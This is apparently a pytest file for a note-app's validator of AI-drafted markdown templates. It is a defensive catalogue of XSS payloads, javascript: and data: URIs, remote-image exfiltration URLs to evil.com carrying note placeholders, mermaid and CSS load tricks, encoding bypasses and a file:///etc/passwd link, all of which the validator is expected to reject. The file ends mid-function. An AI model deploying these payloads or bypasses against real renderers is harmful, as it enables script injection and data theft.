"""AI template drafting (C4): prompt, extraction, validation, one repair turn."""
from __future__ import annotations

import pytest

from ghostbrain.templates import generate
from ghostbrain.templates.draft_rules import URL_MESSAGE
from ghostbrain.templates.functions import FIELDS, FILTERS, PROMPT_TYPES, VARIABLES
from ghostbrain.templates.generate import (
    MAX_DRAFT_CHARS,
    SAMPLE_ENV,
    TEMPLATE_TOOLS,
    DraftInvalid,
    GenerateError,
    build_prompt,
    check_draft,
    draft_template,
    extract_draft,
    repair_prompt,
    run_turn,
    system_prompt,
    verify_exact,
)
from ghostbrain.templates.parse import parse_template
from ghostbrain.templates.render import RenderError, render
from ghostbrain.templates.starters import STARTER_TEMPLATES

GOOD = """---
template:
  name: Standup
  description: Daily standup notes
  prompts:
    - id: team
      ask: Which team?
      type: text
  file:
    folder: "20-contexts/{{context}}/standups"
    name: "{{date | format: YYYY-MM-DD}} {{team}} standup"
---
# {{team}} standup — {{date | format: D MMM}}

## Blockers

```query
type: action_item
status: open
```
"""


def codes(draft: str) -> list[str]:
    return [d.code for d in check_draft(draft).problems]


def test_system_prompt_documents_every_registry_entry_and_the_rules():
    text = system_prompt()
    for spec in (*VARIABLES, *FILTERS, *PROMPT_TYPES):
        assert f"- {spec.name}" in text
    for spec in FIELDS:
        assert f"- {spec.owner}.{spec.name}:" in text
    assert "never under 90-meta" in text and "---" in text


def test_build_prompt_fences_the_request_as_data():
    p = build_prompt("  weekly review with Alex  ")
    assert p.endswith("<<<\nweekly review with Alex\n>>>")


@pytest.mark.parametrize(
    "answer",
    [
        GOOD,
        "```markdown\n" + GOOD + "```",
        "```\n" + GOOD + "```\n",
        "Here is your template:\n\n" + GOOD,
        GOOD.replace("\n", "\r\n"),
    ],
)
def test_extract_draft_unwraps_the_file(answer):
    assert extract_draft(answer) == GOOD


def test_good_draft_and_every_starter_pass():
    assert check_draft(GOOD).ok
    for src in STARTER_TEMPLATES.values():
        assert check_draft(src).ok


@pytest.mark.parametrize(
    ("change", "code"),
    [
        (("name: Standup", "name: [oops"), "yaml"),
        (("## Blockers", '<script src="x.js"></script>'), "forbidden"),
        (("## Blockers", '<img src="x" onerror="alert(1)">'), "forbidden"),
        (("## Blockers", "[x](javascript:alert(1))"), "forbidden"),
        (("```query", "```js"), "forbidden"),
        (("```query", "```dataviewjs"), "forbidden"),
        (("# {{team}}", "# {{teem}}"), "unknown-placeholder"),
        (("# {{team}}", "# {{team.name}}"), "unknown-placeholder"),
        (("# {{team}}", "# {{team | shout}}"), "unknown-placeholder"),
        (('"20-contexts/{{context}}/standups"', '"../../outside"'), "render"),
        (('"20-contexts/{{context}}/standups"', '"90-meta/templates"'), "render"),
    ],
)
def test_bad_drafts_are_rejected_with_a_located_problem(change, code):
    draft = GOOD.replace(*change)
    assert draft != GOOD
    found = check_draft(draft)
    assert not found.ok
    assert code in [d.code for d in found.problems]
    assert all(d.line >= 1 and d.severity == "error" for d in found.problems)


def test_oversize_draft_is_rejected():
    assert codes(GOOD + "x" * MAX_DRAFT_CHARS) == ["too-long"]


def test_mermaid_and_plain_fences_are_allowed():
    draft = GOOD.replace("## Blockers", "```mermaid\ngraph TD; A-->B\n```\n\n```\nplain\n```")
    assert check_draft(draft).ok


def test_valid_first_draft_needs_one_turn():
    calls = []

    def turn(prompt, *, turn_key):
        calls.append((prompt, turn_key))
        return GOOD

    d = draft_template("standup notes", turn=turn)
    assert d.source == GOOD and d.template.name == "Standup"
    assert len(calls) == 1 and calls[0][1].startswith("templates:generate:")


def test_invalid_draft_gets_one_repair_turn_with_the_problems():
    answers = iter([GOOD.replace("# {{team}}", "# {{teem}}"), GOOD])
    prompts = []

    def turn(prompt, *, turn_key):
        prompts.append(prompt)
        return next(answers)

    assert draft_template("standup", turn=turn).source == GOOD
    assert len(prompts) == 2
    assert "is not a known placeholder" in prompts[1] and "{{teem}}" in prompts[1]


def test_invalid_twice_raises_with_the_last_draft():
    bad = GOOD.replace("## Blockers", "<script>x</script>")
    with pytest.raises(DraftInvalid) as e:
        draft_template("standup", turn=lambda prompt, *, turn_key: bad)
    assert e.value.draft == bad
    assert e.value.problems[0].code == "forbidden"
    assert str(e.value).startswith("the draft is not a valid template (line ")


class _Provider:
    def __init__(self, events):
        self.events = events
        self.requests = []

    def chat(self, req):
        self.requests.append(req)
        yield from self.events


def test_run_turn_is_read_only_and_uses_no_user_servers(monkeypatch):
    provider = _Provider([{"type": "delta", "text": "---"}, {"type": "done", "text": GOOD}])
    monkeypatch.setattr("ghostbrain.llm.providers.get_provider", lambda cfg=None: provider)
    assert run_turn("p", turn_key="k") == GOOD
    [req] = provider.requests
    assert req.user_servers == [] and req.session_id is None
    assert req.allowed_tools == TEMPLATE_TOOLS
    assert req.allowed_tools == "mcp__poltergeist__poltergeist_search"
    for tool in ("poltergeist_get_note", "poltergeist_write_doc", "poltergeist_ask"):
        assert tool not in req.allowed_tools
    assert req.system_prompt == system_prompt()


def test_run_turn_falls_back_to_deltas_and_reports_errors(monkeypatch):
    provider = _Provider([{"type": "delta", "text": "a"}, {"type": "delta", "text": "b"},
                          {"type": "done", "text": ""}])
    monkeypatch.setattr("ghostbrain.llm.providers.get_provider", lambda cfg=None: provider)
    assert run_turn("p", turn_key="k") == "ab"
    monkeypatch.setattr("ghostbrain.llm.providers.get_provider",
                        lambda cfg=None: _Provider([{"type": "error", "message": "rate limited"}]))
    with pytest.raises(GenerateError, match="rate limited"):
        run_turn("p", turn_key="k")
    monkeypatch.setattr("ghostbrain.llm.providers.get_provider",
                        lambda cfg=None: _Provider([{"type": "done", "text": "  "}]))
    with pytest.raises(GenerateError, match="nothing"):
        run_turn("p", turn_key="k")


def test_draft_template_uses_run_turn_by_default(monkeypatch):
    monkeypatch.setattr(generate, "run_turn", lambda prompt, *, turn_key: GOOD)
    assert draft_template("x").source == GOOD


@pytest.mark.parametrize(
    "html",
    ["<div>hi</div>", '<img src="x">', "<!-- note -->", "text <b>bold</b> text"],
)
def test_raw_html_is_rejected(html):
    found = check_draft(GOOD.replace("## Blockers", html))
    assert not found.ok
    [problem] = [d for d in found.problems if d.code == "forbidden"]
    assert problem.severity == "error"
    assert problem.line == GOOD.split("\n").index("## Blockers") + 1


def test_html_already_flagged_is_reported_once_per_line():
    found = check_draft(GOOD.replace("## Blockers", "<script>x</script>"))
    assert [d.code for d in found.problems] == ["forbidden"]


def test_html_inside_a_code_fence_is_rejected_too():
    draft = GOOD.replace("## Blockers", "```\n<div>shown as text</div>\n```")
    assert "forbidden" in codes(draft)


@pytest.mark.parametrize(
    "image",
    [
        "![](https://example.com/p.png?{{team}})",
        "![chart](http://example.com/c.png)",
        "![x](//example.com/x.png)",
        "![x]( <https://example.com/x.png> )",
        "![x][logo]\n\n[logo]: https://example.com/logo.png",
        "![logo]\n\n[LOGO]: //example.com/logo.png",
    ],
)
def test_remote_images_are_rejected(image):
    found = check_draft(GOOD.replace("## Blockers", image))
    assert not found.ok
    problems = [d for d in found.problems if d.code == "forbidden"]
    assert problems and all(d.severity == "error" for d in problems)
    # located at the line holding the URL
    url_line = next(i for i, line in enumerate(image.split("\n")) if "//" in line)
    assert problems[0].line == GOOD.split("\n").index("## Blockers") + 1 + url_line


def test_local_links_and_images_are_allowed():
    draft = GOOD.replace(
        "## Blockers",
        "[docs](notes/docs.md)\n\n![local](attachments/x.png)\n\n"
        "[ref]: notes/page.md",
    )
    assert check_draft(draft).ok


# ── Fix round 1 + Task 1b ─────────────────────────────────────────────────

BLOCKERS_LINE = GOOD.split("\n").index("## Blockers") + 1
OPTIONAL_TEAM = GOOD.replace("      type: text\n", "      type: text\n      optional: true\n", 1)


def forbidden(draft: str) -> list:
    found = check_draft(draft)
    assert not found.ok
    out = [d for d in found.problems if d.code == "forbidden"]
    assert out and all(d.severity == "error" and d.line >= 1 for d in out)
    return out


@pytest.mark.parametrize(
    "body",
    [
        # the reviewer's probes: filter literals that render live HTML/script
        "{{date | format: [<]}}script>alert(1){{date | format: [<]}}/script>",
        "[x]({{date | format: [java]}}{{date | format: [script:alert(1)]}})",
    ],
)
def test_filter_literals_that_render_html_or_script_are_rejected(body):
    forbidden(GOOD.replace("## Blockers", body))


def test_default_literal_that_renders_a_script_is_rejected():
    forbidden(OPTIONAL_TEAM.replace(
        "## Blockers", "{{team | default: <}}script>alert(1){{team | default: <}}/script>"))


def test_blank_optional_render_is_checked_even_without_markup_characters():
    # sample answers render "samplesample"; only the blank render shows the link
    draft = OPTIONAL_TEAM.replace(
        "## Blockers", "{{team | default: java}}{{team | default: script:alert(1)}}")
    assert check_draft(OPTIONAL_TEAM.replace("## Blockers", "{{team | default: java}}")).ok
    [problem] = forbidden(draft)
    assert problem.message.startswith("in the note it creates: javascript")


@pytest.mark.parametrize("arg", ["[<]", "[>]", "[&amp;]", "[`]", "[\\]"])
def test_format_and_default_arguments_cannot_hold_markup_characters(arg):
    for filt in ("format", "default"):
        draft = OPTIONAL_TEAM.replace("## Blockers", f"{{{{date | {filt}: {arg}}}}}")
        assert forbidden(draft)[0].line == OPTIONAL_TEAM.split("\n").index("## Blockers") + 1


@pytest.mark.parametrize(
    "prompt_extra",
    [
        "      default: \"<b>x</b>\"\n",
        "      default: \"https://evil.com/?\"\n",
    ],
)
def test_prompt_defaults_cannot_hold_html_or_links(prompt_extra):
    forbidden(GOOD.replace("      type: text\n", "      type: text\n" + prompt_extra, 1))


def test_choice_options_cannot_hold_html_or_links():
    draft = GOOD.replace(
        "      type: text\n",
        "      type: choice\n      options: [ok, \"<script>x</script>\", \"https://evil.com/?\"]\n", 1)
    assert len(forbidden(draft)) >= 2


def test_a_link_assembled_from_filter_literals_is_rejected():
    forbidden(GOOD.replace("## Blockers", "{{date | format: [https://evil.com/?]}}{{team}}"))


@pytest.mark.parametrize(
    "image",
    [
        "![x](https&#58;//evil.com/p.png?{{team}})",
        "![x](https:&#47;&#47;evil.com/p.png)",
        "![x](https:evil.com/p.png)",
        "![x](HTTPS://evil.com/p.png)",
        "![x](data:image/png;base64,AAAA)",
        "![a\\]b](https://evil.com/p.png)",
        "![a [b] c](https://evil.com/p.png)",
        "![x](\nhttps://evil.com/p.png)",
        "![alt\nmore](https://evil.com/p.png)",
        "![x][l]\n\n[l]:\nhttps://evil.com/p.png",
        "![x][l]\n\n> [l]: https://evil.com/p.png",
        "![x][l]\n\n- [l]: https://evil.com/p.png",
        "![x][l]\n\n[l]: https&#58;//evil.com/p.png",
        "![x]({{date | format: [https://evil.com/p.png?]}}{{team}})",
    ],
)
def test_remote_image_bypasses_are_rejected(image):
    forbidden(GOOD.replace("## Blockers", image))


@pytest.mark.parametrize(
    "label",
    [
        "A[\"<img src='https://evil.com/p.png?{{team}}'>\"]",
        "A[\"<img src=x.png>\"]",
        "A[\"//evil.com/p.png\"]",
        "click A href \"https://evil.com\"",
        "click A \"https://evil.com/x\"",
        "click A call evil()",
        "A[\"<a href=x>y</a>\"]",
    ],
)
def test_mermaid_cannot_carry_images_links_or_urls(label):
    forbidden(GOOD.replace("## Blockers", f"```mermaid\ngraph TD;\n{label}\n```"))


@pytest.mark.parametrize(
    "link",
    [
        "[x](https://evil.com/?q={{team}})",
        "[x]({{team}})",
        "<https://evil.com/{{team}}>",
        "https://evil.com/?q={{team}}",
        "www.evil.com/{{team}}",
        "[x][r]\n\n[r]: https://evil.com/{{team}}",
        "[x](\n{{team}})",
    ],
)
def test_links_built_from_placeholders_are_rejected(link):
    forbidden(GOOD.replace("## Blockers", link))


def test_system_prompt_rules_cover_html_images_urls_and_search_only():
    text = system_prompt()
    assert "no raw html tags" in text.lower()
    assert "templates must not contain URLs, // or :/" in text
    assert "(not even `Path: /x`)" in text
    assert "You may search the user's notes" in text and "never copy text from them" in text
    assert TEMPLATE_TOOLS == "mcp__poltergeist__poltergeist_search"


# parser differential: validate exactly the text that is written


def test_extract_draft_strips_a_bom_and_normalises_line_endings():
    assert extract_draft("\ufeff" + GOOD) == GOOD
    assert extract_draft(GOOD.replace("\n", "\r")) == GOOD


@pytest.mark.parametrize("bad", ["\ufeff" + GOOD, GOOD.replace("\n", "\r\n"),
                                 GOOD.replace("## Blockers", "## Block\u2028ers"),
                                 GOOD.replace("## Blockers", "## Block\x00ers")])
def test_check_draft_rejects_text_other_parsers_split_differently(bad):
    assert not check_draft(bad).ok


def test_duplicate_frontmatter_keys_are_rejected():
    draft = GOOD.replace("  name: Standup\n", "  name: Standup\n  name: Other\n")
    found = check_draft(draft)
    assert not found.ok
    [dup] = [d for d in found.problems if d.code == "yaml"]
    assert dup.line == 4 and "name" in dup.message


def test_yaml_anchors_are_rejected():
    draft = GOOD.replace("  name: Standup\n", "  name: &n Standup\n  description: *n\n") \
        .replace("  description: Daily standup notes\n", "")
    assert not check_draft(draft).ok


def test_a_second_frontmatter_block_is_rejected():
    draft = GOOD.replace("# {{team}} standup", "---\ntemplate:\n  name: Evil\n---\n# {{team}} standup")
    assert "forbidden" in codes(draft)


@pytest.mark.parametrize(
    "answer",
    [
        GOOD + "```\n<b>x</b>\n",  # a stray fence after the file
        GOOD.replace("status: open\n```\n", "status: open\n<b>x</b>\n"),  # never closed
    ],
)
def test_stray_and_unclosed_fences_hide_nothing(answer):
    assert "forbidden" in codes(extract_draft(answer))


def test_verify_exact_accepts_the_validated_text_only():
    template = check_draft(GOOD).template
    assert template is not None
    verify_exact(GOOD, template)
    for changed in (GOOD.replace("name: Standup", "name: Standup 2"),
                    GOOD.replace("## Blockers", "## Risks"),
                    GOOD.replace("\n", "\r\n"),
                    "\ufeff" + GOOD):
        with pytest.raises(DraftInvalid):
            verify_exact(changed, template)


def test_folder_and_name_answers_cannot_escape_the_vault():
    draft = GOOD.replace('"20-contexts/{{context}}/standups"', '"20-contexts/{{context}}/{{team}}"') \
        .replace('"{{date | format: YYYY-MM-DD}} {{team}} standup"', '"{{team}}"')
    template = check_draft(draft).template
    assert template is not None
    with pytest.raises(RenderError):
        render(template, {"team": "../../90-meta"}, SAMPLE_ENV)
    note = render(parse_template(GOOD, "t").template, {"team": "../../x/../y"}, SAMPLE_ENV)
    assert "/" not in note.filename and ".." not in note.filename
    assert note.folder == "20-contexts/sample/standups"


# ── Fix round 2: no fence or inline-code exemptions ───────────────────────

PAYLOADS = [
    "<img src=x>",
    "<b>hi</b>",
    "![x](https://evil.com/p.png)",
    "[x](https://evil.com/?q={{team}})",
    "<https://evil.com/{{team}}>",
    "[r]: https://evil.com/{{team}}",
    "javascript:alert(1)",
    "data:text/html,x",
    "vbscript:msgbox(1)",
    "//evil.com/p.png",
]
HIDING = {
    "fence": "```\n{}\n```",
    "mermaid": "```mermaid\ngraph TD\n{}\n```",
    "tilde": "~~~\n{}\n~~~",
    "unclosed": "```\n{}",
    "space-closer": "```mermaid\ngraph TD\n    ```\n{}\n```",
    "tab-closer": "```mermaid\ngraph TD\n\t```\n{}\n```",
    "list-nested": "- ```\n  {}\n  ```",
    "mismatched": "````\n```\n{}\n````",
    "inline-code": "`{}`",
    "comment": "<!-- {} -->",
    "plain": "{}",
}


def _entities(payload: str) -> str:
    return payload.replace("<", "&lt;").replace(":", "&#58;").replace("/", "&#47;")


@pytest.mark.parametrize("payload", PAYLOADS)
@pytest.mark.parametrize("hiding", sorted(HIDING))
def test_payloads_are_found_wherever_they_hide(payload, hiding):
    for p in (payload, _entities(payload)):
        assert "forbidden" in codes(GOOD.replace("## Blockers", HIDING[hiding].format(p)))


@pytest.mark.parametrize("hiding", sorted(set(HIDING) - {"comment"}))
def test_the_hiding_places_alone_are_fine(hiding):
    assert check_draft(GOOD.replace("## Blockers", HIDING[hiding].format("hello"))).ok


@pytest.mark.parametrize(
    "body",
    [
        "```mermaid\nstyle A fill:url(#104;ttps:#47;#47;evil.com/p.png)\n```",
        "```mermaid\nA[\"#60;img src=x#62;\"]\n```",
        "```mermaid\nA[\"<image srcset='#47;#47;evil.com/p.png'>\"]\n```",
        "java&#9;script:alert(1)",
    ],
)
def test_mermaid_entity_codes_and_css_urls_are_rejected(body):
    assert "forbidden" in codes(GOOD.replace("## Blockers", body))


@pytest.mark.parametrize(
    "definition",
    [
        "[p\nq]: https://evil.com/p.png",
        "[p\nq]: //evil.com/p.png",
        "[p\nq]:\nhttps://evil.com/p.png",
    ],
)
def test_multi_line_reference_labels_to_remote_urls_are_rejected(definition):
    assert "forbidden" in codes(GOOD.replace("## Blockers", f"![p q]\n\n{definition}"))


def test_yaml_merge_keys_are_rejected():
    draft = GOOD.replace("  name: Standup\n", "  name: Standup\n  <<: {description: merged}\n") \
        .replace("  description: Daily standup notes\n", "")
    found = check_draft(draft)
    assert not found.ok
    assert any(d.code == "yaml" and "<<" in d.message for d in found.problems)


@pytest.mark.parametrize("email", ["{{team}}@evil.com", "x@{{team}}.com", "a.b+c@{{team}}"])
def test_email_autolinks_with_placeholders_are_rejected(email):
    assert "forbidden" in codes(GOOD.replace("## Blockers", f"Mail {email} today"))


@pytest.mark.parametrize(
    "body",
    [
        "cc @{{team}}",
        "Intro\n\n---\n\nMore",
        "5 < 10 and a->b, Q&A",
        "Click the link below.",
    ],
)
def test_ordinary_text_still_passes(body):
    assert check_draft(GOOD.replace("## Blockers", body)).ok


@pytest.mark.parametrize(
    "answer",
    [
        "Here you go:\n\n```markdown\n" + GOOD + "```",
        "```markdown\n" + GOOD + "```\nLet me know!",
        "Sure.\n```md\n" + GOOD + "```\n\nAnything else?",
    ],
)
def test_extract_draft_unwraps_a_fence_with_chatter_around_it(answer):
    assert extract_draft(answer) == GOOD
    assert check_draft(extract_draft(answer)).ok


# ── Fix round 3 ───────────────────────────────────────────────────────────

# Regression table: every draft e05d6def's check_draft rejected, from its
# tests and from its in-fence rules (_FENCED_RULES). Bodies replace
# "## Blockers" in GOOD unless they are whole drafts (start with "---").
E05D6DEF_REJECTED = {
    # test_filter_literals_that_render_html_or_script_are_rejected
    "format-lt-script": "{{date | format: [<]}}script>alert(1){{date | format: [<]}}/script>",
    "format-javascript": "[x]({{date | format: [java]}}{{date | format: [script:alert(1)]}})",
    # test_a_link_assembled_from_filter_literals_is_rejected
    "format-url": "{{date | format: [https://evil.com/?]}}{{team}}",
    # test_raw_html_is_rejected / test_html_already_flagged / ruling A
    "div": "<div>hi</div>",
    "img-tag": '<img src="x">',
    "comment": "<!-- note -->",
    "inline-b": "text <b>bold</b> text",
    "script": "<script>x</script>",
    # test_remote_images_are_rejected
    "img-https-ph": "![](https://example.com/p.png?{{team}})",
    "img-http": "![chart](http://example.com/c.png)",
    "img-proto-rel": "![x](//example.com/x.png)",
    "img-angle-space": "![x]( <https://example.com/x.png> )",
    "img-ref": "![x][logo]\n\n[logo]: https://example.com/logo.png",
    "img-shortcut-ref": "![logo]\n\n[LOGO]: //example.com/logo.png",
    # test_remote_image_bypasses_are_rejected
    "img-entity-colon": "![x](https&#58;//evil.com/p.png?{{team}})",
    "img-entity-slashes": "![x](https:&#47;&#47;evil.com/p.png)",
    "img-no-slashes": "![x](https:evil.com/p.png)",
    "img-upper": "![x](HTTPS://evil.com/p.png)",
    "img-data": "![x](data:image/png;base64,AAAA)",
    "img-escaped-alt": "![a\\]b](https://evil.com/p.png)",
    "img-nested-alt": "![a [b] c](https://evil.com/p.png)",
    "img-dest-next-line": "![x](\nhttps://evil.com/p.png)",
    "img-alt-next-line": "![alt\nmore](https://evil.com/p.png)",
    "img-def-next-line": "![x][l]\n\n[l]:\nhttps://evil.com/p.png",
    "img-def-quote": "![x][l]\n\n> [l]: https://evil.com/p.png",
    "img-def-list": "![x][l]\n\n- [l]: https://evil.com/p.png",
    "img-def-entity": "![x][l]\n\n[l]: https&#58;//evil.com/p.png",
    "img-format-url": "![x]({{date | format: [https://evil.com/p.png?]}}{{team}})",
    # test_mermaid_cannot_carry_images_links_or_urls (the static label is an
    # exception, see test_e05d6def_exceptions_still_pass)
    "mermaid-img-ph": "```mermaid\ngraph TD;\nA[\"<img src='https://evil.com/p.png?{{team}}'>\"]\n```",
    "mermaid-img": "```mermaid\ngraph TD;\nA[\"<img src=x.png>\"]\n```",
    "mermaid-proto-rel": "```mermaid\ngraph TD;\nA[\"//evil.com/p.png\"]\n```",
    "mermaid-click-href": "```mermaid\ngraph TD;\nclick A href \"https://evil.com\"\n```",
    "mermaid-a-href": "```mermaid\ngraph TD;\nA[\"<a href=x>y</a>\"]\n```",
    # test_links_built_from_placeholders_are_rejected
    "link-ph": "[x](https://evil.com/?q={{team}})",
    "link-ph-relative": "[x]({{team}})",
    "autolink-ph": "<https://evil.com/{{team}}>",
    "bare-ph": "https://evil.com/?q={{team}}",
    "www-ph": "www.evil.com/{{team}}",
    "def-ph": "[x][r]\n\n[r]: https://evil.com/{{team}}",
    "link-dest-next-line": "[x](\n{{team}})",
    # test_bad_drafts_are_rejected_with_a_located_problem (forbidden rows)
    "script-src": '<script src="x.js"></script>',
    "onerror": '<img src="x" onerror="alert(1)">',
    "js-link": "[x](javascript:alert(1))",
    "fence-js": "```js\nalert(1)\n```",
    "fence-dataviewjs": "```dataviewjs\nx\n```",
    # test_stray_and_unclosed_fences_are_rejected (restored in fix round 3)
    "stray-fence": GOOD + "```\n",
    "unclosed-fence": GOOD.replace("status: open\n```\n", "status: open\n"),
    # e05d6def _FENCED_RULES, cases that can load or run something
    "fence-img": "```\n<img src=x.png>\n```",
    "fence-click": "```mermaid\nclick A callback\n```",
    "fence-click-call": "```mermaid\nclick A call cb()\n```",
    "fence-proto-rel": "```\n//evil.com/p.png\n```",
    "fence-data": "```\ndata:image/png;base64,AAAA\n```",
    "fence-url-css": "```mermaid\nstyle A fill:url(https://evil.com/p.png)\n```",
    "fence-www-ph": "```\nwww.evil.com/{{team}}\n```",
    "fence-https-ph": "```\nhttps://evil.com/{{team}}\n```",
    "fence-img-meta": "```mermaid\nflowchart TD\nA@{ img: \"https://evil.com/p.png\" }\n```",
}


def _as_draft(body: str) -> str:
    return body if body.startswith("---") else GOOD.replace("## Blockers", body)


@pytest.mark.parametrize("case", sorted(E05D6DEF_REJECTED))
def test_everything_e05d6def_rejected_is_still_rejected(case):
    assert not check_draft(_as_draft(E05D6DEF_REJECTED[case])).ok


@pytest.mark.parametrize(
    "body",
    [
        # src=/href= words outside any tag: plain text to mermaid and markdown
        "```mermaid\ngraph TD;\nA[\"src=x\"]\n```",
        # prose that starts with "Click", not a mermaid click action
        "```\nClick the button, then wait.\n```",
    ],
)
def test_e05d6def_exceptions_still_pass(body):
    assert check_draft(_as_draft(body)).ok


@pytest.mark.parametrize(
    "body",
    [
        "```mermaid\nflowchart TD\nA@{ img: \"https://evil.com/p.png\", label: \"x\" }\n```",
        "```mermaid\nkanban\n  todo\n    t1[Task]@{ img: 'https://evil.com/p.png' }\n```",
        "```mermaid\nflowchart TD\nA@{ img: \"https:evil.com/p.png\" }\n```",
        "```mermaid\nflowchart TD\nA@{\n  img: \"x.png\",\n  label: \"x\"\n}\n```",
        "```mermaid\nflowchart TD\nA@{ icon: \"fa:user\" }\n```",
        "```mermaid\nflowchart TD\nA@{ shape: rect, label: \"https://evil.com\" }\n```",
        "```mermaid\n%%{init: {\"themeCSS\": \".n{background:https://evil.com/p.png}\"}}%%\ngraph TD\n```",
        "```mermaid\n%%{init: {\n\"themeCSS\": \"x https://evil.com/p.png\"}}%%\ngraph TD\n```",
        "```mermaid\nclassDef c background-image: image-set(\"https://evil.com/p.png\" 1x)\n```",
        "```mermaid\n%%{init: {\"themeCSS\": \"@import 'https://evil.com/x.css';\"}}%%\n```",
        "@import \"https://evil.com/x.css\"",
        "x <y https://evil.com/p.png",
        "< y https://evil.com/p.png >",
    ],
)
def test_remote_loads_are_rejected_whatever_the_tag(body):
    assert "forbidden" in codes(GOOD.replace("## Blockers", body))


@pytest.mark.parametrize(
    "body",
    [
        "![p \\[q]\n\n[p\n\\[q]: https://evil.com/p.png",
        "![[a]\nb](https://evil.com/p.png)",
        "![a\\]\nb](https://evil.com/p.png)",
        "![`]`\nb](https://evil.com/p.png)",
        "![a]\nb](//evil.com/p.png)",
    ],
)
def test_split_alt_text_and_escaped_label_tails_are_rejected(body):
    assert "forbidden" in codes(GOOD.replace("## Blockers", body))


def test_a_bare_url_span_does_not_stop_at_a_quote():
    assert "forbidden" in codes(GOOD.replace("## Blockers", 'See https://evil.com/"{{team}} now'))


def test_an_ordinary_template_still_passes():
    body = (
        "Intro with a [link](notes/docs.md) and a [ref][d].\n\n---\n\n"
        "![diagram](attachments/d.png)\n\n"
        "```mermaid\ngraph TD\nA-->B\nstyle A fill:#f9f\n```\n\n"
        "[d]: notes/ref.md"
    )
    assert check_draft(GOOD.replace("## Blockers", body)).ok


# ── Fix round 4: no URL anywhere (one blanket rule) ───────────────────────


def url_problems(draft: str) -> list:
    return [d for d in forbidden(draft) if URL_MESSAGE in d.message]


# Flipped: these passed before round 4; a URL of any kind is now rejected.
@pytest.mark.parametrize(
    "body",
    [
        "[docs](https://example.com)",
        "[x][ref]\n\n[ref]: https://example.com/page",
        "<https://example.com/docs>",
        "See https://example.com/docs and [docs](https://example.com/docs).",
        "```mermaid\nA[\"x\"] --> B[\"https://example.com\"]\n```",
        "```mermaid\ngraph TD;\nA[\"x\"] --> B[\"https://evil.com\"]\n```",
        "```\nhttps://example.com/docs\n```",
        "```\nftp://example.com/file\n```",
    ],
)
def test_static_urls_that_used_to_pass_are_rejected(body):
    assert url_problems(GOOD.replace("## Blockers", body))


@pytest.mark.parametrize(
    "body",
    [
        # coordinator's vectors: mermaid image shapes, reference images
        "```mermaid\nflowchart TD\nA@{ img: \"https://evil.com/p.png\" }\n```",
        "```mermaid\nflowchart TD\nA@{ img: \"https://evil.com/p.png\", pos: \"t\", h: 60 }\n```",
        "```mermaid\nflowchart TD\nA@{ shape: image, img: \"//evil.com/p.png\" }\n```",
        "![x][ref]\n\n[ref]: https://evil.com/p.png",
        # generic remote loads
        "[x](https://evil.com)",
        "https://evil.com",
        "www.evil.com",
        "//evil.com/p.png",
        "[x](///evil.com/p.png)",
        "[x](\\\\\\\\evil.com/p.png)",
        "[x](/\\evil.com/p.png)",
        "[x](https:evil.com)",
        "```mermaid\nstyle A fill:url(https://evil.com/p.png)\n```",
        "```mermaid\n%%{init: {\"themeCSS\": \"@import url(https://evil.com/x.css);\"}}%%\n```",
        "x ws://evil.com/socket and wss://evil.com",
        "file:///etc/passwd",
        "data:text/html,x",
        "javascript:alert(1)",
        "vbscript:msgbox(1)",
        # Unicode compatibility forms NFKC folds
        "ｈｔｔｐｓ：／／evil．com",
        "https\ufe55//evil.com",
        "https:／／evil.com",
        "ｗｗｗ．evil．com",
        # percent-, entity- and escape-encoded
        "https%3A%2F%2Fevil.com",
        "https%253A%252F%252Fevil.com",
        "https&#58;&#47;&#47;evil.com",
        "https&colon;evil.com",
        "&#x68;ttps:evil.com",
        "java&Tab;script:alert(1)",
        "```mermaid\nA[\"#104;ttps#58;evil.com\"]\n```",
        "```mermaid\nstyle A fill:url(\\68ttps\\3a evil.com)\n```",
        "\\x68ttps:evil.com",
        "\\u0068ttps:evil.com",
        # split by invisible characters, uppercase, across lines
        "ht\u200btps:evil.com",
        "www\u200b.evil.com",
        "/\u200b/evil.com/p.png",
        "HTTPS://EVIL.COM",
        "WWW.EVIL.COM",
        "/\n/evil.com/p.png",
        "ww\nw.evil.com",
        # inside every fence kind, comments and inline code
        "```query\ntype: https://evil.com\n```",
        "```mermaid\ngraph TD\nA-->B[\"www.evil.com\"]\n```",
        "```\nhttps://evil.com\n```",
        "~~~\nhttps://evil.com\n~~~",
        "```text\nhttps://evil.com\n```",
        "```md\nhttps://evil.com\n```",
        "<!-- https://evil.com -->",
        "`https://evil.com`",
    ],
)
def test_urls_are_rejected_in_any_syntax_or_encoding(body):
    assert url_problems(GOOD.replace("## Blockers", body))


@pytest.mark.parametrize(
    ("old", "new"),
    [
        ("description: Daily standup notes", "description: Daily https://evil.com notes"),
        ("description: Daily standup notes", 'description: "\\x68ttps:evil.com"'),
        ("description: Daily standup notes", "description: see www.evil.com"),
        ("name: Standup", "name: Standup ｈｔｔｐｓ：evil.com"),
        ("ask: Which team?", "ask: Which team? (https://evil.com)"),
        ("      type: text\n", "      type: text\n      default: https://evil.com\n"),
        ("      type: text\n", "      type: choice\n      options: [a, \"//evil.com\"]\n"),
        ("{{team}} standup\"", "{{team}} https%3A%2F%2Fevil.com\""),
    ],
)
def test_urls_in_frontmatter_are_rejected(old, new):
    draft = GOOD.replace(old, new, 1)
    assert draft != GOOD
    assert url_problems(draft)


def test_a_url_is_located_at_its_line():
    draft = GOOD.replace("## Blockers", "Intro\nsee ｈｔｔｐｓ：／／evil．com")
    [problem] = url_problems(draft)
    assert problem.line == BLOCKERS_LINE + 1


def test_a_url_split_over_lines_is_located_at_line_1():
    problems = url_problems(GOOD.replace("## Blockers", "Intro.\n/\n/evil.com/p.png"))
    assert problems[0].line == 1 and not problems[0].message.startswith("in the note")


def test_a_url_in_the_rendered_note_is_rejected():
    # neither literal holds a scheme; the rendered note does
    draft = GOOD.replace("## Blockers", "{{date | format: [ht]}}{{date | format: [tps:evil.com]}}")
    assert any(d.message.startswith("in the note it creates:") for d in url_problems(draft))


@pytest.mark.parametrize(
    "body",
    [
        "Note: see below",
        "Ratio 3:1, a/b, Q&A, 50% done (see above); x -> y!",
        "Meeting at 10:30, back at {{date | format: HH:mm}}",
        "Owner: {{ team }}, due {{date | format: D MMM}}",
        "metadata: x",
        "xhttps: and httpserver: are words",
        "```mermaid\ngraph TD\nA-->B\nstyle A fill:#f9f\n```",
        "```query\ntype: action_item\nstatus: open\n```",
    ],
)
def test_text_that_only_looks_like_a_url_passes(body):
    assert check_draft(GOOD.replace("## Blockers", body)).ok


def test_repair_prompt_says_to_remove_every_url():
    problems = check_draft(GOOD.replace("## Blockers", "https://evil.com")).problems
